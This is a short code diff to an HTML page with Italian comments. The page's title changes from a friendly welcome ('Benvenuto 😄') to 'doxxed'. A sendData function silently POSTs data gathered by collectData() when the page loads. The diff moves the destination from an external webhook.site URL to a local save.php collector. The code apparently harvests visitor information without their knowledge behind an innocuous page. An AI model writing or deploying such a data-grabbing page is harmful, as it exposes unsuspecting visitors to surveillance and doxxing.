@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Benvenuto 😄</title>
+  <title>doxxed</title>
   <style>
     body {
       margin: 0;
@@ -68,11 +68,11 @@
     }
 
     function sendData(data) {
-      fetch('https://webhook.site/a7e36058-c9a9-4f83-9740-7f2cc820609a', {
+      fetch('save.php', {  // URL relativo, deve essere nella stessa cartella del file HTML
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
-      });
+      }).catch(err => console.error('Errore invio dati:', err));
     }
 
     collectData();
